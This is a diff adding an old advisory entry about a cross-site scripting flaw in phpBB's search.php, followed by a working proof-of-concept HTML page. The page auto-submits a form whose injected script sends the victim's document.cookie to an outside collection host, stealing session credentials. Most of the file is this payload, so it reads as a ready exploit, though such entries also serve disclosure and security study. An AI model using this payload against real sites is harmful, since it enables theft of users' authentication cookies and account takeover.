@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/6311/info
+
+phpBB is vulnerable to cross site scripting attacks. This is due to insufficient santization of user-supplied input. The problem is located in the search.php script. This issue may be exploited by an attacker to steal a legitimate users cookie-based authentication credentials.
+
+<html>
+<body>
+<form method="post" name="search"
+action="http://target/search.php?mode=searchuser">
+<input type="hidden" name="search_username" value=""/>
+
+</form>
+<SCRIPT>
+search.search_username.value='Http://savecookie/x.php?Cookie="><script>location=search.search_username.value+document.cookie;</script\>';
+document.search.submit();
+</script>
+</body>
+</html>
